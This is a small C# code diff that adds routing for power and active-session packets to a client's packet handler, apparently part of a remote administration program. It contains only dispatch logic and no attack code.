@@ -1,6 +1,5 @@
 ﻿using Client.Controllers;
 using Client.Packets.ServerPackets;
-using System.Windows.Forms;
 
 namespace Client.Packets
 {
@@ -13,6 +12,14 @@ namespace Client.Packets
             if(type == TypePackets.DoAskElevate)
             {
                 Controllers.Tools.CommandController.doAskElevate((DoAskElevate)packet, client);
+            }
+            else if (type == TypePackets.Power)
+            {
+                PowerController.powerButton((Power)packet, client);
+            }
+            else if (type == TypePackets.ActiveSession)
+            {
+                ActiveSessionController.sessionButton((ActiveSession)packet);
             }
             else if (type == TypePackets.SetClientIdentifier)
             {
